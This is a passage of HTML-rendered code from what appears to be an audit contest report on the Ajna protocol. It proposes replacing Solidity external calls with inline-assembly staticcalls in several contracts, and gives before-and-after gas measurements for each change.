</span><span class=\"mtk12\">totalBurnedLatest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">645</span><span class=\"mtk1\">:        ) = </span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool_</span><span class=\"mtk1\">).</span><span class=\"mtk11\">burnInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentBurnEventEpoch_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">646</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">647</span><span class=\"mtk1\">:        (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">648</span><span class=\"mtk1\">:            ,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">649</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalInterestAtBlock</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">650</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalBurnedAtBlock</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">651</span><span class=\"mtk1\">:        ) = </span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool_</span><span class=\"mtk1\">).</span><span class=\"mtk11\">burnInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lastBurnEventEpoch_</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"208\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/RewardsManager.sol b/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 314b476..1d95b55 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -638,18 +638,30 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 currentBurnEventEpoch_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 lastBurnEventEpoch_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) internal view returns (uint256, uint256, uint256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            uint256 currentBurnTime,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            uint256 totalInterestLatest,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            uint256 totalBurnedLatest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        ) = IPool(pool_).burnInfo(currentBurnEventEpoch_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            ,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            uint256 totalInterestAtBlock,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            uint256 totalBurnedAtBlock</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        ) = IPool(pool_).burnInfo(lastBurnEventEpoch_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 currentBurnTime;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 totalInterestLatest;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 totalBurnedLatest;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 totalInterestAtBlock;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 totalBurnedAtBlock;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assembly {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            let memptr := mload(0x40)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            mstore(0x00, 0x2c7b2e06)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            mstore(0x20, currentBurnEventEpoch_)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if iszero(staticcall(gas(), pool_, 0x1c, 0x24, 0x00, 0x60)) {revert(0, 0)}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            currentBurnTime := mload(0x00)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            totalInterestLatest := mload(0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            totalBurnedLatest := mload(0x40)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            mstore(0x00, 0x2c7b2e06)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            mstore(0x20, lastBurnEventEpoch_)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if iszero(staticcall(gas(), pool_, 0x1c, 0x24, 0x00, 0x60)) {revert(0, 0)}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            totalInterestAtBlock := mload(0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            totalBurnedAtBlock := mload(0x40)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            mstore(0x40, memptr)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 totalBurned   = totalBurnedLatest   != 0 ? totalBurnedLatest   - totalBurnedAtBlock   : totalBurnedAtBlock;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 totalInterest = totalInterestLatest != 0 ? totalInterestLatest - totalInterestAtBlock : totalInterestAtBlock;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L416-L427\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L416-L427</a></p>\n<p><em>Gas Savings for <code>PositionManager.mint</code>, obtained via protocol’s tests: 1223 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>98876</td>\n</tr>\n<tr>\n<td>After</td>\n<td>97653</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"209\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PositionManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">416</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_isAjnaPool</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">417:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">pool_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">418:        </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk10\">subsetHash_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">419</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">420</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool_</span><span class=\"mtk1\">).</span><span class=\"mtk11\">collateralAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">421</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">quoteAddress</span><span class=\"mtk1\">      = </span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool_</span><span class=\"mtk1\">).</span><span class=\"mtk11\">quoteTokenAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">422</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">423</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">erc20DeployedPoolAddress</span><span class=\"mtk1\">  = </span><span class=\"mtk12\">erc20PoolFactory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deployedPools</span><span class=\"mtk1\">(</span><span class=\"mtk12\">subsetHash_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateralAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">quoteAddress</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">424</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">erc721DeployedPoolAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">erc721PoolFactory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deployedPools</span><span class=\"mtk1\">(</span><span class=\"mtk12\">subsetHash_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateralAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">quoteAddress</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">425</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">426</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">pool_</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">erc20DeployedPoolAddress</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">pool_</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">erc721DeployedPoolAddress</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">427</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"210\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PositionManager.sol b/src/PositionManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 261fbc1..58d1a6a 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PositionManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PositionManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -417,11 +417,26 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         address pool_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         bytes32 subsetHash_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) internal view returns (bool) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        address collateralAddress = IPool(pool_).collateralAddress();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        address quoteAddress      = IPool(pool_).quoteTokenAddress();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        address erc20DeployedPoolAddress  = erc20PoolFactory.deployedPools(subsetHash_, collateralAddress, quoteAddress);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        address erc721DeployedPoolAddress = erc721PoolFactory.deployedPools(subsetHash_, collateralAddress, quoteAddress);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address erc20DeployedPoolAddress;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address erc721DeployedPoolAddress;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        ERC20PoolFactory _erc20Pool = erc20PoolFactory;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        ERC721PoolFactory _erc721Pool = erc721PoolFactory;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assembly {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            let memptr := mload(0x40)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            let active_mem := mload(0x80)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // function sigs for `collateralAddress()` + `quoteTokenAddress()` + `deployedPools(bytes32,address,address)`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            mstore(0x00, 0x48d399e7bad346207f165b0b)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if iszero(staticcall(gas(), pool_, 0x14, 0x04, 0x40, 0x20)) {revert(0, 0)}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if iszero(staticcall(gas(), pool_, 0x18, 0x04, 0x60, 0x20)) {revert(0, 0)}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            mstore(0x20, subsetHash_)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if iszero(staticcall(gas(), _erc20Pool, 0x1c, 0x64, 0x80, 0x20)) {revert(0, 0)}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            erc20DeployedPoolAddress := mload(0x80)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if iszero(staticcall(gas(), _erc721Pool, 0x1c, 0x64, 0x80, 0x20)) {revert(0, 0)}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            erc721DeployedPoolAddress := mload(0x80)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            mstore(0x40, memptr)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            mstore(0x60, 0x00)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            mstore(0x80, active_mem)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         return (pool_ == erc20DeployedPoolAddress || pool_ == erc721DeployedPoolAddress);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L76-L93\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L76-L93</a></p>\n<p><em>Gas Savings for <code>GrantFund.getVotesFunding</code>, obtained via protocol’s tests: 421 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>11518</td>\n</tr>\n<tr>\n<td>After</td>\n<td>11097</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"211\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Funding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">76</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getVotesAtSnapshotBlocks</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">77:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">account_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">78:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">snapshot_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">79:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">voteStartBlock_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">80</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">81</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">IVotes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ajnaTokenAddress</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">82</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">83</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// calculate the number of votes available at the snapshot block</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">84</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votes1</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPastVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">account_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">snapshot_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">85</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">86</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// enable voting weight to be calculated during the voting period&#39;s start block</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">87</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">voteStartBlock_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">voteStartBlock_</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">voteStartBlock_</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">88</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">89</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// calculate the number of votes available at the stage&#39;s start block</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">90</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votes2</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPastVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">account_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">voteStartBlock_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">91</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">92</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Maths</span><span class=\"mtk1\">.</span><span class=\"mtk11\">min</span><span class=\"mtk1\">(</span><span class=\"mtk12\">votes2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">votes1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">93</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"212\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/Funding.sol b/src/grants/base/Funding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 72fafb9..4bafbcb 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/Funding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/Funding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -79,15 +79,37 @@ abstract contract Funding is IFunding, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 voteStartBlock_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) internal view returns (uint256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         IVotes token = IVotes(ajnaTokenAddress);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 votes1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 votes2;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assembly {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            let memptr := mload(0x40)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            mstore(0x00, 0x3a46b1a8)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            mstore(0x20, account_)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            mstore(0x40, snapshot_)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            let success1 := staticcall(gas(), token, 0x1c, 0x44, 0x40, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if iszero(success1) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                revert(0, 0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            votes1 := mload(0x40)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            for {} 1 {} {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                if iszero(eq(voteStartBlock_, number())) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    break</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                voteStartBlock_ := sub(number(), 1)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                break</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            mstore(0x40, voteStartBlock_)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            let success2 := staticcall(gas(), token, 0x1c, 0x44, 0x40, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if iszero(success2) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                revert(0, 0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            votes2 := mload(0x40)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span 